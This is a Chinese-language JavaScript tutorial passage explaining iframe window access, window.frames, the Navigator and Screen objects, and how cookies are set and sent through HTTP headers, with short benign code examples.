<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> frame = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;theFrame&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> frameWindow = frame.<span class="property">contentWindow</span>;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>frame.contentWindow</code>可以拿到子窗口的<code>window</code>对象。然后，在满足同源限制的情况下，可以读取子窗口内部的属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取子窗口的标题</span></span><br><span class="line">frameWindow.<span class="property">title</span></span><br></pre></td></tr></table></figure>

<p><code> &lt;iframe&gt; </code>元素的contentDocument属性，可以拿到子窗口的document对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> frame = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;theFrame&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> frameDoc = frame.<span class="property">contentDocument</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> frameDoc = frame.<span class="property">contentWindow</span>.<span class="property">document</span>;</span><br></pre></td></tr></table></figure>

<p><code> &lt;iframe&gt; </code>元素遵守同源政策，只有当父窗口与子窗口在同一个域时，两者之间才可以用脚本通信，否则只有使用window.postMessage方法。</p>
<p><code> &lt;iframe&gt; </code>窗口内部，使用window.parent引用父窗口。如果当前页面没有父窗口，则window.parent属性返回自身。因此，可以通过window.parent是否等于window.self，判断当前窗口是否为iframe窗口。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">parent</span> !== <span class="variable language_">window</span>.<span class="property">self</span>) &#123;</span><br><span class="line">  <span class="comment">// 当前窗口是子窗口</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code> &lt;iframe&gt; </code>窗口的window对象，有一个frameElement属性，返回<code>&lt;iframe&gt;</code>在父窗口中的 DOM 节点。对于非嵌入的窗口，该属性等于null。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f1Element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;f1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> f1Window = f1Element.<span class="property">contentWindow</span>;</span><br><span class="line"></span><br><span class="line">f1Window.<span class="property">frameElement</span> === f1Element <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">frameElement</span> === <span class="literal">null</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h4 id="5-3-window-frames-属性"><a href="#5-3-window-frames-属性" class="headerlink" title="5.3 window.frames 属性"></a>5.3 window.frames 属性</h4><p><code>window.frames</code>属性返回一个类似数组的对象，成员是所有子窗口的<code>window</code>对象。可以使用这个属性，实现窗口之间的互相引用。比如，<code>frames[0]</code>返回第一个子窗口，<code>frames[1].frames[2]</code>返回第二个子窗口内部的第三个子窗口，<code>parent.frames[1]</code>返回父窗口的第二个子窗口。</p>
<p>注意，<code>window.frames</code>每个成员的值，是框架内的窗口（即框架的<code>window</code>对象），而不是<code>iframe</code>标签在父窗口的 DOM 节点。如果要获取每个框架内部的 DOM 树，需要使用<code>window.frames[0].document</code>的写法。</p>
<p>另外，如果<code> &lt;iframe&gt; </code>元素设置了<code>name</code>或<code>id</code>属性，那么属性值会自动成为全局变量，并且可以通过<code>window.frames</code>属性引用，返回子窗口的<code>window</code>对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为 &lt;iframe id=&quot;myFrame&quot;&gt;</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">myFrame</span> <span class="comment">// [HTMLIFrameElement]</span></span><br><span class="line">frames.<span class="property">myframe</span> === myFrame <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>另外，<code>name</code>属性的值会自动成为子窗口的名称，可以用在<code>window.open</code>方法的第二个参数，或者<code> &lt;a&gt; </code>和<code>&lt;frame&gt;</code>标签的<code>target</code>属性。</p>
<p>​	</p>
<h2 id="三、Navigator-对象，Screen-对象"><a href="#三、Navigator-对象，Screen-对象" class="headerlink" title="三、Navigator 对象，Screen 对象"></a>三、Navigator 对象，Screen 对象</h2><p> <code>window.navigator</code>属性指向一个<strong>包含浏览器和系统信息的 Navigator 对象</strong>。脚本通过这个属性了解用户的环境信息。 </p>
<h3 id="1、Navigator-对象的属性"><a href="#1、Navigator-对象的属性" class="headerlink" title="1、Navigator 对象的属性"></a>1、Navigator 对象的属性</h3><h4 id="1-1-Navigator-userAgent-浏览器厂商和版本"><a href="#1-1-Navigator-userAgent-浏览器厂商和版本" class="headerlink" title="1.1 Navigator.userAgent 浏览器厂商和版本"></a>1.1 Navigator.userAgent 浏览器厂商和版本</h4><p><code>navigator.userAgent</code>属性返回浏览器的 User Agent 字符串，表示<strong>浏览器的厂商和版本信息</strong>。</p>
<p>下面是 Chrome 浏览器的<code>userAgent</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="property">userAgent</span></span><br><span class="line"><span class="comment">// &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36&quot;</span></span><br></pre></td></tr></table></figure>

<p>通过<code>userAgent</code>属性识别浏览器，不是一个好办法。因为必须考虑所有的情况（不同的浏览器，不同的版本），非常麻烦，而且用户可以改变这个字符串。这个字符串的格式并无统一规定，也无法保证未来的适用性，各种上网设备层出不穷，难以穷尽。所以，现在一般不再通过它识别浏览器了，而是使用“功能识别”方法，即逐一测试当前浏览器是否支持要用到的 JavaScript 功能。</p>
<p>不过，通过<code>userAgent</code>可以大致准确地识别手机浏览器，方法就是测试是否包含<code>mobi</code>字符串。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ua = navigator.<span class="property">userAgent</span>.<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="regexp">/mobi/i</span>.<span class="title function_">test</span>(ua)) &#123;</span><br><span class="line">  <span class="comment">// 手机浏览器</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 非手机浏览器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果想要识别所有移动设备的浏览器，可以测试更多的特征字符串。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/mobi|android|touch|mini/i.<span class="title function_">test</span>(ua)</span><br></pre></td></tr></table></figure>



<h4 id="1-2-Navigator-plugins-浏览器插件"><a href="#1-2-Navigator-plugins-浏览器插件" class="headerlink" title="1.2 Navigator.plugins 浏览器插件"></a>1.2 Navigator.plugins 浏览器插件</h4><p><code>Navigator.plugins</code>属性返回一个<strong>类似数组的对象</strong>，成员是 Plugin 实例对象，表示<strong>浏览器安装的插件</strong>，比如 Flash、ActiveX 等。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pluginsLength = navigator.<span class="property">plugins</span>.<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; pluginsLength; i++) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(navigator.<span class="property">plugins</span>[i].<span class="property">name</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(navigator.<span class="property">plugins</span>[i].<span class="property">filename</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(navigator.<span class="property">plugins</span>[i].<span class="property">description</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(navigator.<span class="property">plugins</span>[i].<span class="property">version</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="1-3-Navigator-platform-操作系统信息"><a href="#1-3-Navigator-platform-操作系统信息" class="headerlink" title="1.3 Navigator.platform 操作系统信息"></a>1.3 Navigator.platform 操作系统信息</h4><p><code>Navigator.platform</code>属性<strong>返回用户的操作系统信息</strong>，比如<code>MacIntel</code>、<code>Win32</code>、<code>Linux x86_64</code>等 。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="property">platform</span></span><br><span class="line"><span class="comment">// &quot;Linux x86_64&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="1-4-Navigator-onLine-是否在线"><a href="#1-4-Navigator-onLine-是否在线" class="headerlink" title="1.4 Navigator.onLine 是否在线"></a>1.4 Navigator.onLine 是否在线</h4><p><code>navigator.onLine</code>属性返回一个<strong>布尔值</strong>，表示<strong>用户当前在线还是离线（浏览器断线）</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="property">onLine</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>有时，浏览器可以连接局域网，但是局域网不能连通外网。这时，有的浏览器的<code>onLine</code>属性会返回<code>true</code>，所以不能假定只要是<code>true</code>，用户就一定能访问互联网。不过，如果是<code>false</code>，可以断定用户一定离线。</p>
<p><strong>用户变成在线会触发<code>online</code>事件，变成离线会触发<code>offline</code>事件，可以通过<code>window.ononline</code>和<code>window.onoffline</code>指定这两个事件的回调函数。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;offline&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;offline&#x27;</span>); &#125;);</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;online&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;online&#x27;</span>); &#125;);</span><br></pre></td></tr></table></figure>



<h4 id="1-5-Navigator-language-首选语言，Navigator-languages-可以接受的语言，数组"><a href="#1-5-Navigator-language-首选语言，Navigator-languages-可以接受的语言，数组" class="headerlink" title="1.5 Navigator.language 首选语言，Navigator.languages 可以接受的语言，数组"></a>1.5 Navigator.language 首选语言，Navigator.languages 可以接受的语言，数组</h4><p><code>Navigator.language</code>属性返回一个<strong>字符串</strong>，表示<strong>浏览器的首选语言</strong>。该属性<strong>只读</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="property">language</span> <span class="comment">// &quot;en&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>Navigator.languages</code>属性返回一个<strong>数组</strong>，表示<strong>用户可以接受的语言</strong>。<code>Navigator.language</code>总是这个数组的第一个成员。HTTP 请求头信息的<code>Accept-Language</code>字段，就来自这个数组。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="property">languages</span>  <span class="comment">// [&quot;en-US&quot;, &quot;en&quot;, &quot;zh-CN&quot;, &quot;zh&quot;, &quot;zh-TW&quot;]</span></span><br></pre></td></tr></table></figure>

<p>如果这个属性发生变化，就会在<code>window</code>对象上触发<code>languagechange</code>事件。</p>
<h4 id="1-6-Navigator-geolocation-地理位置"><a href="#1-6-Navigator-geolocation-地理位置" class="headerlink" title="1.6 Navigator.geolocation 地理位置"></a>1.6 Navigator.geolocation 地理位置</h4><p><code>Navigator.geolocation</code>属性返回一个 Geolocation 对象，包含<strong>用户地理位置的信息</strong>。注意，该 API 只有在 HTTPS 协议下可用，否则调用下面方法时会报错。</p>
<p>Geolocation 对象提供下面三个方法。</p>
<ul>
<li>Geolocation.getCurrentPosition()：得到用户的当前位置</li>
<li>Geolocation.watchPosition()：监听用户位置变化</li>
<li>Geolocation.clearWatch()：取消<code>watchPosition()</code>方法指定的监听函数</li>
</ul>
<p>注意，调用这三个方法时，浏览器会跳出一个对话框，要求用户给予授权。</p>
<h4 id="1-7-Navigator-cookieEnabled-浏览器Cookie是否打开"><a href="#1-7-Navigator-cookieEnabled-浏览器Cookie是否打开" class="headerlink" title="1.7 Navigator.cookieEnabled 浏览器Cookie是否打开"></a>1.7 Navigator.cookieEnabled 浏览器Cookie是否打开</h4><p><code>Navigator.cookieEnabled</code>属性返回一个布尔值，表示<strong>浏览器的 Cookie 功能是否打开</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="property">cookieEnabled</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p><strong>注意，这个属性反映的是浏览器总的特性，与是否储存某个具体的网站的 Cookie 无关</strong>。用户可以设置某个网站不得储存 Cookie，这时<code>cookieEnabled</code>返回的还是<code>true</code>。</p>
<h3 id="2、Navigator-对象的方法"><a href="#2、Navigator-对象的方法" class="headerlink" title="2、Navigator 对象的方法"></a>2、Navigator 对象的方法</h3><h4 id="2-1-Navigator-javaEnabled-是否能运行-Java-Applet-小程序"><a href="#2-1-Navigator-javaEnabled-是否能运行-Java-Applet-小程序" class="headerlink" title="2.1 Navigator.javaEnabled() 是否能运行 Java Applet 小程序"></a>2.1 Navigator.javaEnabled() 是否能运行 Java Applet 小程序</h4><p><code>Navigator.javaEnabled()</code>方法返回一个布尔值，表示<strong>浏览器是否能运行 Java Applet 小程序</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="title function_">javaEnabled</span>() <span class="comment">// false</span></span><br></pre></td></tr></table></figure>



<h4 id="2-1-Navigator-sendBeacon-用于向服务器异步发送数据"><a href="#2-1-Navigator-sendBeacon-用于向服务器异步发送数据" class="headerlink" title="2.1 Navigator.sendBeacon() 用于向服务器异步发送数据"></a>2.1 Navigator.sendBeacon() 用于向服务器异步发送数据</h4><p><code>Navigator.sendBeacon()</code>方法<strong>用于向服务器异步发送数据</strong>，详见《XMLHttpRequest 对象》一章。</p>
<h3 id="3、Screen-对象-（屏幕信息对象）"><a href="#3、Screen-对象-（屏幕信息对象）" class="headerlink" title="3、Screen 对象 （屏幕信息对象）"></a>3、Screen 对象 （屏幕信息对象）</h3><p>Screen 对象表示<strong>当前窗口所在的屏幕</strong>，提供显示设备的信息。<code>window.screen</code>属性指向这个对象。</p>
<p>该对象有下面的属性。</p>
<ul>
<li><code>Screen.height</code>：浏览器窗口所在的<strong>屏幕的高度</strong>（单位像素）。除非调整显示器的分辨率，否则这个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。</li>
<li><code>Screen.width</code>：浏览器窗口所在的<strong>屏幕的宽度</strong>（单位像素）。</li>
<li><code>Screen.availHeight</code>：浏览器<strong>窗口可用的屏幕高度</strong>（单位像素）。因为部分空间可能不可用，比如系统的任务栏或者 Mac 系统屏幕底部的 Dock 区，这个属性等于<code>height</code>减去那些被系统组件的高度。</li>
<li><code>Screen.availWidth</code>：浏览器<strong>窗口可用的屏幕宽度</strong>（单位像素）。</li>
<li><code>Screen.pixelDepth</code>：整数，表示<strong>屏幕的色彩位数</strong>，比如<code>24</code>表示屏幕提供24位色彩。</li>
<li><code>Screen.colorDepth</code>：<code>Screen.pixelDepth</code>的别名。严格地说，colorDepth 表示<strong>应用程序的颜色深度</strong>，pixelDepth 表示<strong>屏幕的颜色深度</strong>，绝大多数情况下，它们都是同一件事。</li>
<li><code>Screen.orientation</code>：返回一个对象，表示<strong>屏幕的方向</strong>。该对象的<code>type</code>属性是一个字符串，表示屏幕的具体方向，<code>landscape-primary</code>表示横放，<code>landscape-secondary</code>表示颠倒的横放，<code>portrait-primary</code>表示竖放，<code>portrait-secondary</code>。</li>
</ul>
<p>下面是<code>Screen.orientation</code>的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">orientation</span></span><br><span class="line"><span class="comment">// &#123; angle: 0, type: &quot;landscape-primary&quot;, onchange: null &#125;</span></span><br></pre></td></tr></table></figure>

<p>下面的例子保证屏幕分辨率大于 1024 x 768。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">width</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">height</span> &gt;= <span class="number">768</span>) &#123;</span><br><span class="line">  <span class="comment">// 分辨率不低于 1024x768</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是<strong>根据屏幕的宽度，将用户导向不同网页的代码。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((screen.<span class="property">width</span> &lt;= <span class="number">800</span>) &amp;&amp; (screen.<span class="property">height</span> &lt;= <span class="number">600</span>)) &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;small.html&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;wide.html&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​					</p>
<h2 id="四、Cookie"><a href="#四、Cookie" class="headerlink" title="四、Cookie"></a>四、Cookie</h2><h3 id="1、概述-1"><a href="#1、概述-1" class="headerlink" title="1、概述"></a>1、概述</h3><p>Cookie 是<strong>服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB</strong>。<strong>浏览器每次向服务器发出请求，就会自动附上这段信息</strong>。</p>
<p>Cookie 主要保存状态信息，以下是一些主要用途。</p>
<ul>
<li>对话（session）管理：保存登录、购物车等需要记录的信息。</li>
<li>个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。</li>
<li>追踪用户：记录和分析用户行为。</li>
</ul>
<p>Cookie 不是一种理想的客户端储存机制。它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。<strong>只有那些每次请求都需要让服务器知道的信息，才应该放在 Cookie 里面。</strong></p>
<p>每个 Cookie 都有以下几方面的元数据。</p>
<ul>
<li>Cookie 的名字</li>
<li>Cookie 的值（真正的数据写在这里面）</li>
<li>到期时间（超过这个时间会失效）</li>
<li>所属域名（默认为当前域名）</li>
<li>生效的路径（默认为当前网址）</li>
</ul>
<p>举例来说，用户访问网址<code>www.example.com</code>，服务器在浏览器写入一个 Cookie。这个 Cookie 的所属域名为<code>www.example.com</code>，生效路径为根路径<code>/</code>。如果 Cookie 的生效路径设为<code>/forums</code>，那么这个 Cookie 只有在访问<code>www.example.com/forums</code>及其子路径时才有效。以后，浏览器访问某个路径之前，就会找出对该域名和路径有效，并且还没有到期的 Cookie，一起发送给服务器。</p>
<p>用户可以设置浏览器不接受 Cookie，也可以设置不向服务器发送 Cookie。<code>window.navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">navigator</span>.<span class="property">cookieEnabled</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p><code>document.cookie</code>属性返回当前网页的 Cookie。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> <span class="comment">// &quot;id=foo;key=bar&quot;</span></span><br></pre></td></tr></table></figure>

<p>不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。</p>
<p>浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，<code>http://example.com</code>设置的 Cookie，可以被<code>https://example.com</code>读取。</p>
<h3 id="2、Cookie-与-HTTP-协议"><a href="#2、Cookie-与-HTTP-协议" class="headerlink" title="2、Cookie 与 HTTP 协议"></a>2、Cookie 与 HTTP 协议</h3><p>Cookie <strong>由 HTTP 协议生成，也主要是供 HTTP 协议使用。</strong></p>
<h4 id="2-1-HTTP-回应：Cookie-的生成"><a href="#2-1-HTTP-回应：Cookie-的生成" class="headerlink" title="2.1 HTTP 回应：Cookie 的生成"></a>2.1 HTTP 回应：Cookie 的生成</h4><p>服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个<code>Set-Cookie</code>字段。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>:foo=bar</span><br></pre></td></tr></table></figure>

<p>上面代码会在浏览器保存一个名为<code>foo</code>的 Cookie，它的值为<code>bar</code>。</p>
<p>HTTP 回应可以包含多个<code>Set-Cookie</code>字段，即在浏览器生成多个 Cookie。下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">HTTP</span>/<span class="number">1.0</span> <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="attr">type</span>: text/html</span><br><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: yummy_cookie=choco</span><br><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: tasty_cookie=strawberry</span><br><span class="line"></span><br><span class="line">[page content]</span><br></pre></td></tr></table></figure>

<p>除了 Cookie 的值，<code>Set-Cookie</code>字段还可以附加 Cookie 的属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: &lt;cookie-name&gt;=&lt;cookie-value&gt;; <span class="title class_">Expires</span>=&lt;date&gt;</span><br><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: &lt;cookie-name&gt;=&lt;cookie-value&gt;; <span class="title class_">Max</span>-<span class="title class_">Age</span>=&lt;non-zero-digit&gt;</span><br><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: &lt;cookie-name&gt;=&lt;cookie-value&gt;; <span class="title class_">Domain</span>=&lt;domain-value&gt;</span><br><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: &lt;cookie-name&gt;=&lt;cookie-value&gt;; <span class="title class_">Path</span>=&lt;path-value&gt;</span><br><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: &lt;cookie-name&gt;=&lt;cookie-value&gt;; <span class="title class_">Secure</span></span><br><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: &lt;cookie-name&gt;=&lt;cookie-value&gt;; <span class="title class_">HttpOnly</span></span><br></pre></td></tr></table></figure>

<p>上面的几个属性的含义，将在后文解释。</p>
<p>一个<code>Set-Cookie</code>字段里面，可以同时包括多个属性，没有次序的要求。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: &lt;cookie-name&gt;=&lt;cookie-value&gt;; <span class="title class_">Domain</span>=&lt;domain-value&gt;; <span class="title class_">Secure</span>; <span class="title class_">HttpOnly</span></span><br></pre></td></tr></table></figure>

<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: id=a3fWa; <span class="title class_">Expires</span>=<span class="title class_">Wed</span>, <span class="number">21</span> <span class="title class_">Oct</span> <span class="number">2015</span> <span class="number">07</span>:<span class="number">28</span>:<span class="number">00</span> <span class="variable constant_">GMT</span>; <span class="title class_">Secure</span>; <span class="title class_">HttpOnly</span></span><br></pre></td></tr></table></figure>

<p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的<code>key</code>、<code>domain</code>、<code>path</code>和<code>secure</code>都匹配。举例来说，如果原始的 Cookie 是用如下的<code>Set-Cookie</code>设置的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: key1=value1; domain=example.<span class="property">com</span>; path=/blog</span><br></pre></td></tr></table></figure>

<p>改变上面这个 Cookie 的值，就必须使用同样的<code>Set-Cookie</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: key1=value2; domain=example.<span class="property">com</span>; path=/blog</span><br></pre></td></tr></table></figure>

<p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: key1=value2; domain=example.<span class="property">com</span>; path=/</span><br></pre></td></tr></table></figure>

<p>上面的命令设置了一个全新的同名 Cookie，但是<code>path</code>属性不一样。下一次访问<code>example.com/blog</code>的时候，浏览器将向服务器发送两个同名的 Cookie。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Cookie</span>: key1=value1; key1=value2</span><br></pre></td></tr></table></figure>

<p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p>
<h4 id="2-2-HTTP-请求：Cookie-的发送"><a href="#2-2-HTTP-请求：Cookie-的发送" class="headerlink" title="2.2 HTTP 请求：Cookie 的发送"></a>2.2 HTTP 请求：Cookie 的发送</h4><p>浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的<code>Cookie</code>字段。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Cookie</span>: foo=bar</span><br></pre></td></tr></table></figure>

<p>上面代码会向服务器发送名为<code>foo</code>的 Cookie，值为<code>bar</code>。</p>
<p><code>Cookie</code>字段可以包含多个 Cookie，使用分号（<code>;</code>）分隔。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Cookie</span>: name=value; name2=value2; name3=value3</span><br></pre></td></tr></table></figure>

<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /sample_page.<span class="property">html</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: www.<span class="property">example</span>.<span class="property">org</span></span><br><span class="line"><span class="title class_">Cookie</span>: yummy_cookie=choco; tasty_cookie=strawberry</span><br></pre></td></tr></table></figure>

<p>服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。</p>
<ul>
<li>Cookie 的各种属性，比如何时过期。</li>
<li>哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。</li>
</ul>
